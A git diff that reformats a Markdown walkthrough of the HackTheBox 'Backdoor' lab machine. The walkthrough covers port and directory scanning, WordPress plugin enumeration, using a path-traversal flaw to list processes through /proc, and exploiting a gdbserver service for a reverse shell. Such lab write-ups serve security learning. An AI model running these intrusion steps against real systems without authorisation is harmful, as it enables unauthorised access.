@@ -1,18 +1,24 @@
+![Header](screenshots/header.png)
+
 ## Enumeration
 
-The IP is 10.10.11.125, I will add it to /etc/hosts
+The IP is 10.10.11.125, I will add it to /etc/hosts:
+
+![/etc/hosts/ picture](screenshots/etc-hosts.png)
 
 Let's start off by enumerating the open ports:
 
-`nmap -p- --open -sS -v -n -Pn backdoor.htb -oG allPorts`
+```bash
+nmap -p- --open -sS -v -n -Pn backdoor.htb -oG allPorts
+```
   
 It returns ports 22, 80 and 1337 as being open. 
   
 I will run a nmap script to list the services and their versions that are running on each open port
   
-`nmap -p22,80,1337 -sCV <ip> -oN targeted`
+```bash
+nmap -p22,80,1337 -sCV backdoor.htb -oN targeted
 
-```
 PORT     STATE SERVICE VERSION
 22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
 | ssh-hostkey: 
@@ -31,9 +37,9 @@ If you try to access via browser you will get an innocent website, where you can
 
 Let's try to list subdirectories using wfuzz:
 
-`wfuzz -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-small.txt -u "backdoor.htb/FUZZ" --hc=404 -c`
+```bash
+wfuzz -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-small.txt -u "backdoor.htb/FUZZ" --hc=404 -c
 
-```
 =====================================================================
 ID           Response   Lines    Word       Chars       Payload
 =====================================================================
@@ -45,9 +51,9 @@ ID           Response   Lines    Word       Chars       Payload
 Knowing that we are dealing with Wordpress as the CMS, we can try running wpscan to list vulnerable plugins.
 You will need an API token, which you can get [here](wpscan.com).
 
-`wpscan --url http://backdoor.htb/ --enumerate vp --plugins-detection aggressive --api-token <token>`
+```bash
+wpscan --url http://backdoor.htb/ --enumerate vp --plugins-detection aggressive --api-token <token>
 
-```
 [+] ebook-download
  | Location: http://backdoor.htb/wp-content/plugins/ebook-download/
  | Last Updated: 2020-03-12T12:52:00.000Z
@@ -75,13 +81,13 @@ You will need an API token, which you can get [here](wpscan.com).
 
 ## Foothold
 
-We can see that there is a vulnerable plugin called Ebook Download. If we search for it on searchsploit, we fill find file with id 39575.
+We can see that there is a vulnerable plugin called Ebook Download. If we search for it on searchsploit, we fill find file with **id 39575**.
 I will download it on my computer using:
 
 `searchsploit -m 39575`
 
 If we open the text file, we can see that the plugin is vulnerable to Path Traversal and Local File Inclusion.
-We can list running processes using the path /proc/<pid>/cmdline.
+We can list running processes using the path /proc/*pid*/cmdline, where pid is a valid process ID.
 Using a Python script to iterate through the PIDs, we can find which are running.
 
 ```python
@@ -118,10 +124,12 @@ for pid in range(0,5000):
 
 We see that there's a service called gdbserver running on the open port 1337:
   
-```
+```bash
 [+] Process 850 found
 b'/proc/850/cmdline/proc/850/cmdline/proc/850/cmdline/bin/sh\x00-c\x00while true;do su user -c "cd /home/user;gdbserver --once 0.0.0.0:1337 /bin/true;";done\x00<script>window.close()</script>'
 ```
   
-If we look for it on searchsploit we will find a vulnerability with id 50539.
+If we look for it on searchsploit we will find a vulnerability with **id 50539**.
 If we run it and follow the instructions provided, we can get a reverse shell as user and view the flag.
+
+![whoami output](screenshots/foothold.png)
